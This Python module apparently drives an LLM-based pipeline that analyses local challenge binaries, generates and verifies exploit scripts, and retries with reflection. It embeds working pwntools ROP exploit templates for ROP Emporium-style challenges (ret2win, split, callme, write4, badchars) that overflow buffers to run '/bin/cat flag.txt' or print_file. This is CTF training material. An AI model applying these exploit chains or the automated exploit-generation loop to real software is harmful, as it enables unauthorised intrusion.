from __future__ import annotations

import traceback
from pathlib import Path
from time import perf_counter
import re
import ast

from .analysis import BinaryAnalyzer
from .config import PipelineConfig
from .llm_client import LLMClient, LLMError
from .generation import ExploitGenerator, GenerationParseError
from .schemas import VerificationResult
from .utils import ensure_dir, ensure_executable, sanitize_filename, utc_timestamp, write_json
from .verification import ExploitVerifier


class SolveOrchestrator:
    def __init__(self, config: PipelineConfig, prompt_template_path: Path | None = None) -> None:
        self.config = config
        self.analyzer = BinaryAnalyzer()
        self.verifier = ExploitVerifier(config)
        self.client = LLMClient(config)
        self.generator = ExploitGenerator(self.client, prompt_template_path=prompt_template_path)

    def solve(
        self,
        binary_path: Path,
        success_regex: list[str] | None = None,
        max_iterations: int | None = None,
        strict_output: bool | None = None,
        enable_pruning: bool | None = None,
    ) -> dict:
        binary_path = binary_path.resolve()
        ensure_executable(binary_path)
        iterations = max_iterations or self.config.max_iterations
        strict = self.config.strict_output if strict_output is None else strict_output
        prune = self.config.enable_pruning if enable_pruning is None else enable_pruning
        print(f"[solve] solving {binary_path.name}", flush=True)

        run_id = f"{sanitize_filename(binary_path.stem)}_{utc_timestamp().replace(':', '-')}"
        run_dir = self.config.artifact_root / run_id
        ensure_dir(run_dir)

        t0 = perf_counter()
        analysis_report = self.analyzer.analyze(binary_path, prune=prune)
        analysis_path = run_dir / "AnalysisReport.json"
        write_json(analysis_path, analysis_report.to_dict())

        feedback: dict = {
            "message": "first attempt; no previous verification feedback",
            "attempt": 0,
        }
        attempt_logs = []
        attempt_history: list[dict] = []
        solved = False
        success_attempt = None
        last_error = ""
        previous_code = ""
        reflection_text = ""

        heuristic_code = _build_heuristic_exploit(analysis_report.to_dict())
        start_attempt = 1
        if heuristic_code:
            print(f"[solve] {binary_path.name}: attempt 1 heuristic", flush=True)
            attempt_dir = run_dir / "attempt_01"
            ensure_dir(attempt_dir)
            exploit_path = attempt_dir / "exploit.py"
            exploit_path.write_text(heuristic_code + "\n", encoding="utf-8")
            heuristic_strategy = _infer_heuristic_strategy(heuristic_code)
            heuristic_payload = {
                "strategy": heuristic_strategy,
                "code": heuristic_code,
                "success_conditions": "Send extracted candidate input and observe WIN/FLAG markers.",
                "raw_text": "heuristic_pre_llm_attempt",
                "used_format_repair": False,
            }
            write_json(attempt_dir / "GenerationResult.json", heuristic_payload)
            ver = self.verifier.verify(
                binary_path=binary_path,
                exploit_path=exploit_path,
                attempt=1,
                success_regex=success_regex,
            )
            ver.artifacts = {
                "exploit_path": str(exploit_path.resolve()),
                "attempt_dir": str(attempt_dir.resolve()),
            }
            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())
            attempt_logs.append(
                {
                    "attempt": 1,
                    "generation_used_format_repair": False,
                    "verification_status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                    "strategy": heuristic_strategy,
                }
            )
            attempt_history.append(
                {
                    "attempt": 1,
                    "phase": "heuristic",
                    "strategy": heuristic_strategy,
                    "status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                }
            )
            if ver.status == "success":
                solved = True
                success_attempt = 1
                print(f"[solve] {binary_path.name}: solved on heuristic attempt", flush=True)
            else:
                print(
                    f"[solve] {binary_path.name}: heuristic failed - {ver.failure_reason}",
                    flush=True,
                )
                feedback = ver.feedback_payload
                last_error = ver.failure_reason
                previous_code = heuristic_code
                start_attempt = 2

        for attempt in range(start_attempt, iterations + 1):
            if solved:
                break
            print(f"[solve] {binary_path.name}: attempt {attempt} llm", flush=True)
            attempt_dir = run_dir / f"attempt_{attempt:02d}"
            ensure_dir(attempt_dir)
            generation_payload = {}
            try:
                if previous_code or attempt_history:
                    print(f"[solve] {binary_path.name}: attempt {attempt} reflection", flush=True)
                    reflection_text = self.generator.reflect(
                        analysis=analysis_report.to_dict(),
                        attempt=attempt,
                        feedback=feedback,
                        previous_code=previous_code,
                        attempt_history=attempt_history,
                    )
                    (attempt_dir / "Reflection.txt").write_text(reflection_text, encoding="utf-8")
                generation = self.generator.generate(
                    analysis=analysis_report.to_dict(),
                    attempt=attempt,
                    feedback=feedback,
                    strict_output=strict,
                    attempt_history=attempt_history,
                    previous_code=previous_code,
                    reflection_text=reflection_text,
                )
                generation_payload = generation.to_dict()
                write_json(attempt_dir / "GenerationResult.json", generation_payload)
                (attempt_dir / "raw_model_output.txt").write_text(
                    generation.raw_text, encoding="utf-8"
                )
                exploit_path = attempt_dir / "exploit.py"
                exploit_path.write_text(generation.code + "\n", encoding="utf-8")
                code_quality_issue = _detect_code_quality_issue(generation.code)
                if code_quality_issue:
                    issue = {
                        "attempt": attempt,
                        "status": "generation_rejected",
                        "error": code_quality_issue,
                    }
                    write_json(attempt_dir / "GenerationFailure.json", issue)
                    attempt_logs.append(issue)
                    print(
                        f"[solve] {binary_path.name}: attempt {attempt} rejected - {code_quality_issue}",
                        flush=True,
                    )
                    attempt_history.append(
                        {
                            "attempt": attempt,
                            "phase": "generation",
                            "status": "rejected",
                            "failure_reason": code_quality_issue,
                            "reflection_summary": reflection_text,
                        }
                    )
                    feedback = {
                        "attempt": attempt,
                        "status": "generation_rejected",
                        "error": code_quality_issue,
                        "instruction": "produce concrete runnable code without placeholders",
                    }
                    last_error = code_quality_issue
                    continue
            except (LLMError, GenerationParseError) as exc:
                err = {
                    "attempt": attempt,
                    "status": "generation_failed",
                    "error": str(exc),
                    "traceback": traceback.format_exc(limit=3),
                }
                write_json(attempt_dir / "GenerationFailure.json", err)
                attempt_logs.append(err)
                print(
                    f"[solve] {binary_path.name}: attempt {attempt} generation failed - {exc}",
                    flush=True,
                )
                attempt_history.append(
                    {
                        "attempt": attempt,
                        "phase": "generation",
                        "status": "failed",
                        "failure_reason": str(exc),
                        "reflection_summary": reflection_text,
                    }
                )
                feedback = {
                    "attempt": attempt,
                    "status": "generation_failed",
                    "error": str(exc),
                    "instruction": "repair output format and provide runnable exploit code",
                }
                last_error = str(exc)
                continue
            except Exception as exc:  # noqa: BLE001
                err = {
                    "attempt": attempt,
                    "status": "unexpected_generation_error",
                    "error": str(exc),
                    "traceback": traceback.format_exc(limit=6),
                }
                write_json(attempt_dir / "GenerationFailure.json", err)
                attempt_logs.append(err)
                print(
                    f"[solve] {binary_path.name}: attempt {attempt} unexpected generation error - {exc}",
                    flush=True,
                )
                attempt_history.append(
                    {
                        "attempt": attempt,
                        "phase": "generation",
                        "status": "unexpected_error",
                        "failure_reason": str(exc),
                        "reflection_summary": reflection_text,
                    }
                )
                last_error = str(exc)
                continue

            ver: VerificationResult = self.verifier.verify(
                binary_path=binary_path,
                exploit_path=exploit_path,
                attempt=attempt,
                success_regex=success_regex,
            )
            ver.artifacts = {
                "exploit_path": str(exploit_path.resolve()),
                "attempt_dir": str(attempt_dir.resolve()),
            }
            write_json(attempt_dir / "VerificationResult.json", ver.to_dict())

            log_item = {
                "attempt": attempt,
                "generation_used_format_repair": generation_payload.get("used_format_repair", False),
                "verification_status": ver.status,
                "failure_reason": ver.failure_reason,
                "success_reason": ver.success_reason,
            }
            attempt_logs.append(log_item)
            attempt_history.append(
                {
                    "attempt": attempt,
                    "phase": "verification",
                    "status": ver.status,
                    "failure_reason": ver.failure_reason,
                    "success_reason": ver.success_reason,
                    "reflection_summary": reflection_text,
                }
            )

            if ver.status == "success":
                solved = True
                success_attempt = attempt
                print(f"[solve] {binary_path.name}: solved on attempt {attempt}", flush=True)
                break

            feedback = ver.feedback_payload
            last_error = ver.failure_reason
            previous_code = generation.code
            print(
                f"[solve] {binary_path.name}: attempt {attempt} failed - {ver.failure_reason}",
                flush=True,
            )

        elapsed = perf_counter() - t0
        summary = {
            "binary_path": str(binary_path),
            "run_dir": str(run_dir.resolve()),
            "solved": solved,
            "success_attempt": success_attempt,
            "attempts_used": len(attempt_logs),
            "max_iterations": iterations,
            "elapsed_seconds": round(elapsed, 3),
            "strict_output": strict,
            "enable_pruning": prune,
            "last_error": last_error,
            "attempt_logs": attempt_logs,
        }
        write_json(run_dir / "run_summary.json", summary)
        final_status = "SOLVED" if solved else "FAILED"
        print(f"[solve] {binary_path.name}: {final_status}", flush=True)
        return summary


def _detect_code_quality_issue(code: str) -> str | None:
    try:
        ast.parse(code)
    except SyntaxError as exc:
        return f"Generated exploit has Python syntax error: {exc.msg} at line {exc.lineno}"

    placeholders = [
        "CORRECT_CODE_HERE",
        "CORRECT_CODE",
        "REQUIRED_CODE",
        "TODO",
        "FILL_ME",
        "REPLACE_ME",
        "<PLACEHOLDER>",
    ]
    for token in placeholders:
        if token in code:
            return f"Generated exploit contains unresolved placeholder: {token}"
    hardcoded_path_hints = [
        "./branch_puzzle",
        "./chall",
        "./challenge",
        "./binary",
    ]
    for token in hardcoded_path_hints:
        if token in code:
            return f"Generated exploit hardcodes target path instead of using argv: {token}"
    execution_markers = ["subprocess.Popen", "subprocess.run", "process(", "remote(", ".communicate(", ".recvall("]
    if not any(marker in code for marker in execution_markers):
        return "Generated exploit does not appear to execute the target or capture output."
    return None


def _build_heuristic_exploit(analysis: dict) -> str | None:
    rop_heuristic = _build_ret2win_heuristic(analysis)
    if rop_heuristic:
        return rop_heuristic

    split_heuristic = _build_split_heuristic(analysis)
    if split_heuristic:
        return split_heuristic

    callme_heuristic = _build_callme_heuristic(analysis)
    if callme_heuristic:
        return callme_heuristic

    write4_heuristic = _build_write4_heuristic(analysis)
    if write4_heuristic:
        return write4_heuristic

    badchars_heuristic = _build_badchars_heuristic(analysis)
    if badchars_heuristic:
        return badchars_heuristic

    branch_heuristic = _build_branch_input_heuristic(analysis)
    if branch_heuristic:
        return branch_heuristic

    return None


def _build_branch_input_heuristic(analysis: dict) -> str | None:
    strings = analysis.get("interesting_strings", [])
    text_blob = "\n".join(strings)
    if "stack buffer" in text_blob or "pwnme" in text_blob or "ret2win" in text_blob:
        return None

    markers = {"WIN", "Nope", "Say the course code:"}
    candidates = []
    for s in strings:
        if s in markers:
            continue
        if not re.fullmatch(r"[A-Za-z0-9_{}-]{4,64}", s):
            continue
        if s.startswith("GLIBC_") or s.startswith("__") or "/" in s:
            continue
        candidates.append(s)

    if not candidates:
        return None

    preferred = None
    for s in candidates:
        if any(ch.isdigit() for ch in s) and any(ch.isalpha() for ch in s):
            preferred = s
            break
    if preferred is None:
        preferred = candidates[0]

    payload = preferred.encode("utf-8")
    payload_repr = repr(payload + b"\n")

    return f"""import argparse
import subprocess


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    proc = subprocess.Popen(
        [binary],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=False,
    )
    stdout, stderr = proc.communicate(input={payload_repr}, timeout=5)
    if stdout:
        print(stdout.decode(errors="replace"))
    if stderr:
        print(stderr.decode(errors="replace"))


if __name__ == "__main__":
    main()
"""


def _build_ret2win_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_ret2win":
        return None

    exports = set(analysis.get("exports", []))
    pruned_context = analysis.get("pruned_context", [])
    context_blob = "\n".join(item.get("snippet", "") for item in pruned_context)
    strings_blob = "\n".join(analysis.get("interesting_strings", []))

    target_symbol = None
    for candidate in ("ret2win", "win"):
        if candidate in exports or f"<{candidate}>:" in context_blob:
            target_symbol = candidate
            break

    if target_symbol is None:
        return None

    if "stack buffer" not in strings_blob and "read()" not in strings_blob and "gets" not in context_blob:
        return None

    return f"""import argparse
import re
from pwn import ELF, ROP, context, p64, process


def run_once(binary_path, payload):
    target = process(binary_path)
    target.sendline(payload)
    data = target.recvall(timeout=2)
    output = data.decode(errors="replace")
    print(output)
    return output


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)
    win_addr = elf.symbols["{target_symbol}"]
    ret_gadget = None
    try:
        ret_gadget = rop.find_gadget(["ret"]).address
    except Exception:
        ret_gadget = None

    for offset in (24, 32, 40, 44, 48, 56, 64, 72):
        payloads = [b"A" * offset + p64(win_addr)]
        if ret_gadget is not None:
            payloads.insert(0, b"A" * offset + p64(ret_gadget) + p64(win_addr))

        for idx, payload in enumerate(payloads, start=1):
            try:
                print(f"[offset={{offset}} payload={{idx}} len={{len(payload)}}]")
                output = run_once(binary, payload)
            except EOFError:
                continue
            except Exception as exc:
                print(f"[error] {{exc}}")
                continue

            if re.search(r"ROPE\\{{[^}}]+\\}}|FLAG\\{{[^}}]+\\}}|WIN\\b|Well done!", output):
                print("[+] Heuristic ret2win success")
                return

    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_split_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_split":
        return None

    return """import argparse
import re
from pwn import ELF, ROP, context, p64, process


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    system = elf.plt.get("system") or elf.symbols.get("system")
    string_addr = next(elf.search(b"/bin/cat flag.txt"))
    offset = 40

    payload = b"A" * offset + p64(ret) + p64(pop_rdi) + p64(string_addr) + p64(system)

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_callme_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_callme":
        return None

    return """import argparse
import re
from pwn import ELF, context, p64, process


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf

    a = 0xdeadbeefdeadbeef
    b = 0xcafebabecafebabe
    c = 0xd00df00dd00df00d

    gadget = elf.symbols["usefulGadgets"]
    payload = b"A" * 40
    for fn in ("callme_one", "callme_two", "callme_three"):
        payload += p64(gadget)
        payload += p64(a)
        payload += p64(b)
        payload += p64(c)
        payload += p64(elf.symbols[fn])

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_write4_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_write4":
        return None

    return """import argparse
import re
import subprocess
from pwn import ELF, ROP, context, p64, process


def find_gadget_addr(binary, needle_lines, return_offset=0):
    out = subprocess.check_output(["objdump", "-d", "-M", "intel", binary], text=True)
    lines = out.splitlines()
    for idx in range(len(lines) - len(needle_lines) + 1):
        ok = True
        for off, needle in enumerate(needle_lines):
            if needle not in lines[idx + off]:
                ok = False
                break
        if ok:
            return int(lines[idx + return_offset].split(":")[0].strip(), 16)
    raise RuntimeError(f"gadget not found: {needle_lines}")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf

    data_addr = elf.bss(0x80)
    rop = ROP(elf)
    pop_r14_r15 = rop.find_gadget(["pop r14", "pop r15", "ret"]).address
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    mov_r14_r15 = find_gadget_addr(
        binary,
        ["pop r14", "pop r15", "ret", "mov    QWORD PTR [r14],r15", "ret"],
        return_offset=3,
    )
    print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")
    target = b"flag.txt"

    payload = b"A" * 40
    payload += p64(pop_r14_r15) + p64(data_addr) + target
    payload += p64(mov_r14_r15)
    payload += p64(ret)
    payload += p64(pop_rdi) + p64(data_addr)
    payload += p64(print_file)

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _build_badchars_heuristic(analysis: dict) -> str | None:
    if analysis.get("binary_name") != "rop_badchars":
        return None

    return """import argparse
import re
import subprocess
from pwn import ELF, ROP, context, p64, process


def find_gadget_addr(binary, needle_lines, return_offset=0):
    out = subprocess.check_output(["objdump", "-d", "-M", "intel", binary], text=True)
    lines = out.splitlines()
    for idx in range(len(lines) - len(needle_lines) + 1):
        ok = True
        for off, needle in enumerate(needle_lines):
            if needle not in lines[idx + off]:
                ok = False
                break
        if ok:
            return int(lines[idx + return_offset].split(":")[0].strip(), 16)
    raise RuntimeError(f"gadget not found: {needle_lines}")


def xor_bytes(data, key):
    return bytes(b ^ key for b in data)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("binary", nargs="?", default=None)
    parser.add_argument("--binary", dest="binary_flag", default=None)
    args = parser.parse_args()
    binary = args.binary_flag or args.binary
    if not binary:
        raise SystemExit("missing binary path")

    elf = ELF(binary, checksec=False)
    context.binary = elf
    rop = ROP(elf)

    key = 2
    target = b"flag.txt"
    encoded = xor_bytes(target, key)
    data_addr = elf.bss(0x80)

    pop_r12_r13_r14_r15 = rop.find_gadget(["pop r12", "pop r13", "pop r14", "pop r15", "ret"]).address
    mov_r13_r12 = find_gadget_addr(
        binary,
        ["pop r12", "pop r13", "pop r14", "pop r15", "ret", "mov    QWORD PTR [r13],r12", "ret"],
        return_offset=5,
    )
    xor_r15_r14b = find_gadget_addr(
        binary,
        ["pop r12", "pop r13", "pop r14", "pop r15", "ret", "xor    BYTE PTR [r15],r14b", "ret"],
        return_offset=5,
    )
    pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address
    print_file = elf.plt.get("print_file") or elf.symbols.get("print_file")

    payload = b"A" * 40
    payload += p64(pop_r12_r13_r14_r15)
    payload += encoded
    payload += p64(data_addr)
    payload += p64(key)
    payload += p64(data_addr)
    payload += p64(mov_r13_r12)

    for i in range(len(target)):
        payload += p64(pop_r12_r13_r14_r15)
        payload += b"BBBBBBBB"
        payload += p64(0)
        payload += p64(key)
        payload += p64(data_addr + i)
        payload += p64(xor_r15_r14b)

    payload += p64(ret)
    payload += p64(pop_rdi) + p64(data_addr)
    payload += p64(print_file)

    io = process(binary)
    io.sendline(payload)
    output = io.recvall(timeout=2).decode(errors="replace")
    print(output)

    if re.search(r"ROPE\\{[^}]+\\}|FLAG\\{[^}]+\\}|WIN\\b", output):
        return
    raise SystemExit(1)


if __name__ == "__main__":
    main()
"""


def _infer_heuristic_strategy(code: str) -> str:
    if "Heuristic ret2win success" in code:
        return "heuristic_ret2win"
    if 'callme_one' in code and 'callme_two' in code and 'callme_three' in code:
        return "heuristic_callme"
    if '"/bin/cat flag.txt"' in code or "system =" in code:
        return "heuristic_split"
    if "xor byte ptr [r15], r14b" in code:
        return "heuristic_badchars"
    if "mov qword ptr [r14], r15" in code and "print_file" in code:
        return "heuristic_write4"
    return "heuristic_branch_input"
